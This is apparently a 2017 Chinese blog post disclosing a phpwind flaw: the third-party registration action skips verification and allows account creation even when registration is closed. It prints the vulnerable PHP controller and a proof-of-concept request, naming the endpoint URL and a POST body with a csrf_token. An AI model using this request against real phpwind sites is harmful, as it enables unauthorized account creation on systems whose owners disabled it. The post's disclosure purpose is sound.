---
layout: post
title:  "phpwind绕过关闭注册"
date:   2017-03-12 14:15:59
comments: true
categories: php bug
---

##phpwind绕过关闭注册

这里通过post方法传递参数的值后直接注册成功



```javascript


    public function doThirdRegistAction(){
        //第三方登录注册不校验验证码
        /*
        if(Wekit::load("verify.srv.PwCheckVerifyService")->checkVerify($this->getInput('code')) != true){
            $this->showError('USER:verifycode.error','index.php?m=u&c=login');
        }
         */
        //post参数中获取用户注册信息、第三方授权获取的信息通过hidden标签保存
        $username = $this->getInput('username','post');
        $password = $this->getInput('password','post');
        $email = $this->getInput('email','post');
        $gender = $this->getInput('gender','post');
        $uid = $this->getInput('uid','post');
        $type = $this->getInput('type','post');
        $avatar = $this->getInput('avatar','post');
        //执行注册
        Wind::import('SRC:service.user.dm.PwUserInfoDm');
        $userDm = new PwUserInfoDm();
        $userDm->setUsername($username);
        $userDm->setPassword($password);
        $userDm->setEmail($email);
        $userDm->setGender($gender);
        $userDm->setRegdate(Pw::getTime());
        $userDm->setLastvisit(Pw::getTime());
        $userDm->setRegip(Wind::getComponent('request')->getClientIp());
        $userDm->setStatus(0);
        Wind::import('SRV:user.srv.PwRegisterService');
        $registerService = new PwRegisterService();
        $registerService->setUserDm($userDm);
        // [u_regsiter]:插件扩展
        $this->runHook('c_register', $registerService);
        if (($info = $registerService->register()) instanceof PwError) {
            $this->showError($info->getError());
        }
        // 这里取了lastInsertId，但已经指定了主键的值，所以返回false表示成功。。
        if ($this->_getUserOpenAccountDs()->addUser($info['uid'], $uid, $type) == false) {
            $this->downloadThirdPlatformAvatar($info['uid'], $avatar);
        }
        // 以便后面登录用到
        $acctRelationData = array('uid' => $info['uid']);
        //继续登录
        $login = new PwLoginService();
        $this->runHook('c_login_dorun', $login);
        Wind::import('SRV:user.srv.PwRegisterService');
        $registerService = new PwRegisterService();
        $info = $registerService->sysUser($acctRelationData['uid']);
        if (!$info) {
            $this->showError('USER:user.syn.error');
        }
        $identity = PwLoginService::createLoginIdentify($info);
        $identity = base64_encode($identity . '|' . $this->getInput('backurl') . '|' . /* rememberme = */'0');
        $this->forwardRedirect(WindUrlHelper::createUrl('u/login/welcome', array('_statu' => $identity)));
    }

.........



```


csrf_token 查看源码获取


测试方法

http://www.xxxxx.com/index.php?m=u&c=login&a=doThirdRegist



username=hhhhhhaaa&password=123123&email=rrrrrrr@qq.com&gender=female&uid=2b2sd&type=1&avatar=abasdsadca&csrf_token=1c0dc295cab42ba2


